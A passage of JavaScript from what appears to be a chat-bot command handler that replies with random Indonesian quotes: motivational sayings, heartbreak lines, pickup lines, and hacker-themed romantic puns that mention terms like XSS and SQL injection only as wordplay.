"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    replyz(motivasii)
}
break
//=========================================\\======
case 'quotesgalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  replyz(bacotan)
}
break
//=========================================\\======
case 'quotesgombal': {
    function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const gombal = [
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "Seandainya sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "Aku gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "Kamu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "Kalausaja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "denganambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta.",
    "Kalo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku harap kamu tidak menanyakan hal terindah yang pernah singgah di kehidupanku, karena jawaban nya adalah kamu.",
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "seandainyaa sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "kuu gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "kamuu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "jikaa saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "atuu tambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta,.",
    "aloo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku tak pernah berjanji untuk sebuah perasaan, namun aku berusaha berjanji untuk sebuah kesetiaan.",
    "Aku sangat berharap kamu tau, kalau aku tidak pernah menyesali cintaku untuk mu, karena bagiku memiliki kamu sudah cukup bagi ku.",
    "Jangankan memilikimu, mendengar kamu kentut aja aku sudah bahagia.",
    "Aku mohon jangan jalan-jalan terus di pikiranku, duduk yang manis di hatiku saja.",
    "Berulang tahun memang indah, namun bagiku yang lebih indah jika berulang kali bersamamu.",
    "Napas aku kok sesek banget ya?, karena separuh nafasku ada di kamu.",
    "Jika ada seseorang lebih memilih pergi meninggalkan kamu, jangan pernah memohon padanya untuk tetap bertahan. Karena jika dia cinta, dia tak akan mau pergi.",
    "jangann diam aja dong, memang diam itu emas, tapi ketahuilah suara kamu itu seperti berlian.",
    "Kesasar itu serasa rugi banget, namun aku nggak merasa rugi karena cintaku sudah Biasanya orang yang lagi nyasar itu rugi ya, tapi tau gak? Aku gak merasa rugi sebab cintaku sudah nyasar ke hati bidadari.",
    "Ada 3 hal yang paling aku sukai di dunia ini, yaitu Matahari, Bulan dan Kamu. Matahari untuk siang hari, Bulan untuk malam hari dan Kamu untuk selamanya dihatiku.",
    "Sayang, kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.",
    "kuu gak perlu wanita yang sholeha, tapi bagaimana menuntun wanita yang aku cintai menjadi seorang yang sholehah.",
    "Aku tidak minta bintang atau bulan kepadamu. Cukup temani aku selamanya di bawah cahayanya.",
    "Akuana kalo kita berdua jadi komplotan penjahat: Aku mencuri hatimu, dan kamu mencuri hatiku?",
    "Aku gak perlu wanita yang cantik, tapi bagaimana aku menyanjung wanita yang aku cintai seperti wanita yang paling cantik di bumi ini.",
    "Aku pengen bersamamu cuma pada dua waktu: SEKARANG dan SELAMANYA.",
    "Akuu tuh bikin aku ga bisa tidur tau ga?",
    "Soalnya kamu selalu ada dibayang-bayang aku terus.",
    "Jika aku bisa jadi bagian dari dirimu,aku mau jadi air matamu,yang tersimpan di hatimu, lahir dari matamu, hidup di pipimu, dan mati di bibirmu.",
    "Papa kamu pasti kerja di apotik ya? | kenapa bang? | karena cuma kamu obat sakit hatiku.",
    "akuu selalu berusaha tak menangis karenamu, karena setiap butir yang jatuh, hanya makin mengingatkan, betapa aku tak bisa melepaskanmu.",
    "mauu nanya jalan nih. Jalan ke hatimu lewat mana ya?",
    "Andai sebuah bintang akan jatuh setiap kali aku mengingatmu, bulan pasti protes. Soalnya dia bakal sendirian di angkasa.",
    "Andai kamu gawang aku bolanya. Aku rela ditendang orang-orang demi aku dapat bersamamu,",
    "Dingin malam ini menusuk tulang. Kesendirian adalah kesepian. Maukah kau jadi selimut penghangat diriku?",
    "Keindahan Borobudur keajaiban dunia, keindahan kamu keajaiban cinta.",
    "Aku ingin mengaku dosa. Jangan pernah marah ya. Maafkan sebelumnya. Tadi malam aku mimpiin kamu jadi pacarku. Setelah bangun, akankah mimpiku jadi nyata?",
    "Kalau nggak sih aku bilang aku cinta kamu hari ini? Kalau besok gimana? Besok lusa? Besoknya besok lusa? Gimana kalau selamanya?",
    "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.",
    "Jika malam adalah jeruji gelap yang menjadi sangkar, saya ingin terjebak selamanya di sana bersamamu.",
    "Sekarang aku gendutan gak sih? Kamu tau gak kenapa ? Soalnya kamu sudah mengembangkan cinta yang banyak di hatiku.",
    "Di atas langit masih ada langit. Di bawah langit masih ada aku yang mencintai kamu.",
    "Tau tidak kenapa malam ini tidak ada bintang? Soalnya bintangnya pindah semua ke matamu?",
    "Aku mencintaimu! Jika kamu benci aku, panah saja diriku. Tapi jangan di hatiku ya, karena di situ kamu berada.",
    "Bapak kamu pasti seorang astronot? | kok tau? | Soalnya aku melihat banyak bintang di matamu.",
    "Bapak kamu dosen ya? | kok tau? | karena nilai kamu A+ di hatiku.",
    "Kamu pasti kuliah di seni pahat ya? | kok tau sih? | Soalnya kamu pintar sekali memahat namamu di hatiku.",
    "Ya Tuhan, jika dia jodohku, menangkanlah tender pembangunan proyek menara cintaku di hatinya.",
    "Kamu mantan pencuri ya? | kok tau? | Abisnya kamu mencuri hatiku sih!",
    "Cowok : Aku suka senyum-senyum sendiri lho. | Cewek : Hah .. Gila Ya | Cowok : Nggak. Aku sedang mikirin kamu.",
    "Setiap malam aku berjalan-jalan di suatu tempat. Kamu tau di mana itu ? | gatau, emang dimana? | Di hatimu.",
    "Kamu pake Telkomesl ya? Karena sinyal-sinyal cintamu sangat kuat sampai ke hatiku.",
    "Kamu tahu gak sih? AKu tuh capek banget. Capek nahan kangen terus sama kamu.",
    "katanyaa kalau sering hujan itu bisa membuat seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.",
    "Aku harap kamu jangan pergi lagi ya? karena, bila aku berpisah dengamu sedetik saja bagaikan 1000 tahun rasanya.",
    "Aku sih gak butuh week end, yang aku butuhkan hanyalah love you till the end.",
    "Emak kamu tukang Gado gado ya?, kok tau sih?, Pantesan saja kamu telah mencampur adukan perasaanku",
    "Walau hari ini cerah, tetapi tanpa kamu disisiku sama saja berselimutkan awan gelap di hati ini",
    "Kamu ngizinin aku kangen sehari berapa kali neng? Abang takut over dosis.",
    "cintaa aku ke kamu tuh bagaikan hutang, awalnya kecil, lama-lama didiemin malah tambah gede.",
    "Berulang tahun adalah hari yang indah. Tapih akin lebih indah kalo udah berulang-ulang kali bersama kamu."
]
let bacotan = pickRandom(gombal)
  replyz(bacotan)

}
break
//=========================================\\======
case 'quoteshacker': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const heker = [
  "Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
  "Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
  "Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
  "berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
  "Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.",
  "Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
  "Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
  "Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
  "Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
  "Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
  "Aku deketin kamu cuma untuk redirect ke hati temenmu.",
  "Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
  "Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
  "kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
  "Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
  "Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
  "SQLI ( Structured Query Love Injection )",
  "aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
  "Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
  "kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
  "Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
  "hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
  "Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
